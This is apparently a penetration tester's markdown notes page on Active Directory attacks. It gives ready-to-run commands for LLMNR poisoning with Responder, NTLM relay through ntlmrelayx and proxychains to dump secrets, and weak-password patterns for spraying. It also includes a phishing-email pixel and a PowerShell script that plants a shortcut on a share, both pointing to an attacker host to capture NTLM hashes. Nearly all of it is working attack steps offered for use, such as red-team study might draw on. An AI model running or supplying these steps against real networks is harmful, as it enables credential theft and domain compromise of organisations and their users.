---
title: AD Attacks
category: Active Directory
order: 99
---

# Password Spraying

Password spraying is an effective technique for discovering weak passwords that users are notorious for using. Patterns such as MonthYear (August2022), SeasonYear (Summer2022) and DayDate (Tuesday6) are very common.

Another pattern too common is the name of the company and the year (Corp2022)


# LLMNR / NetBIOS Poisoning

We can grab some hashed credentials if LLMNR protocol is enabled.

```
sudo responder -I eth0 -Fw
```

After some time we can get all the hashes.

```
cd /usr/share/responder
sudo python DumpHash.py
```

# NTLM Relay (SMB signing disabled)

Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder.

## Configuration

* /etc/proxychains4.conf

```
socks4  127.0.0.1       1080
```

* /usr/share/responder/Responder.conf

```
[Responder Core]

; Servers to start
SMB = Off
HTTP = On
```

## Perform the attack

We need to get a list of the servers with the SMB sigining disabled.

```
crackmapexec smb --gen-relay-list vulnerable_servers.txt 10.10.10.0/24
```

Execute the attack with Responder and Impacket.

```
impacket-ntlmrelayx.py -tf ./vulnerable_servers.txt -socks -smb2support
sudo responder -I eth0
```

We can list the current sessions with the next command.

```
ntlmrelayx> socks
```

When a session with administrative privileges is found we can use secretsdump or other tool with proxychains to use the session captured.

```
proxychains impacket-secretdump DOMAIN/admin@IP
```

# Forcing NTLM Authentication

You can try to socially engineer a privilege user to authenticate to you.

## 1x1 Images in Emails

You can send an invisible 1x1 pixel image embedded on a body of a phishing email. When the recipient view the email in their mail client, such as Outlook, it will attempt to download the image and will trigger an NTLM authentication attemp.

```
<img src="\\<attacker-ip>\image.png" height="1" width="1" />
```

> **Note**: Modify the email signature of a user, so when they send legitimate emails they will trigger NTLM authentication.

## Windows Shortcuts

A windows shortcut can have multiple properties such as directory and an icon.

We can create a icon property pointing to a UNC path and will trigger an NTLM authentication attempt when it's viewed in Explorer even if it doesn't have been clicked.

```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\smbsrv01\software\test.lnk")
$shortcut.IconLocation = "\\<attacker-ip>\test.ico"
$shortcut.Save()
```
A good location would be public readable shares.